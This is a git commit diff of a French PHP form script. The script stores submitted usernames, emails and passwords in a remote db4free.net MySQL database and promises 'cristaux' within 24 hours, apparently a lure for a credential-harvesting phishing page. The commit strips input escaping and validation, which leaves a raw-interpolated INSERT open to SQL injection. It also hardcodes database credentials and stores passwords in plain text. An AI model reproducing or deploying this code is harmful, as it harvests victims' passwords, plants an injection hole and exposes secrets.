6182a16ae0c55b96267dfbf57b3d4a2815c10101
Cloud.goldenfarm2024 <155451124+Goldenfarm2024@users.noreply.github.com>
2024-01-02 21:32:09 -0900

    Update formulaire.php

--- formulaire.php
+++ formulaire.php
@@ -1,32 +1,24 @@
 <?php
 
- if (isset($_POST['submit'])) {
+  {  
 
-    // Vérifiez que les données du formulaire sont valides
-    $username = htmlspecialchars($_POST['username']);
-    $email = htmlspecialchars($_POST['email']);
-    $mot_de_pass = htmlspecialchars($_POST['mot_de_pass']);
+    // Récupérez les données du formulaire
+    $username = $_POST['username'];
+    $email = $_POST['email'];
+    $mot_de_pass = $_POST['mot_de_pass'];
 
-    if (empty($username)) {
-        echo "Le champ Nom d'utilisateur est obligatoire.";
-    } elseif (empty($email)) {
-        echo "Le champ Email est obligatoire.";
-    } elseif (empty($mot_de_pass)) {
-        echo "Le champ Mot de passe est obligatoire.";
-    } else {
+    // Créez une connexion à la base de données
+    $dsn =  'mysql:host=db4free.net;dbname=goldenfarm';
+    $utilisateur = 'admin_users';
+    $password = 'Base3624@';
+    $pdo = new PDO($dsn, $utilisateur, $password);
+ 
+    // Insérez les données dans la base de données
+    $requete = "INSERT INTO Tb_goldenfarm (username, email, mot_de_pass) VALUES ('$username', '$email', '$mot_de_pass')";
+    $pdo->query($requete);
 
-        // Insérez les données dans la base de données
-        $dsn = 'mysql:host=db4free.net;dbname=goldenfarm';
-        $utilisateur = 'admin_users';
-        $password = 'Base3624@';
-        $pdo = new PDO($dsn, $utilisateur, $password);
-
-        $requete = "INSERT INTO Tb_goldenfarm (username, email, mot_de_pass) VALUES ('$username', '$email', '$mot_de_pass')";
-        $pdo->query($requete);
-
-        // Message de succès
-        echo "Félicitations, vous recevrez les cristaux dans les 24 heures, veuillez fermer cette page";
-    }
-
+      // Message de succès
+  echo "Congratulations, you will receive the cristaux within 24 hours, please close this page";
 }
+
 ?>
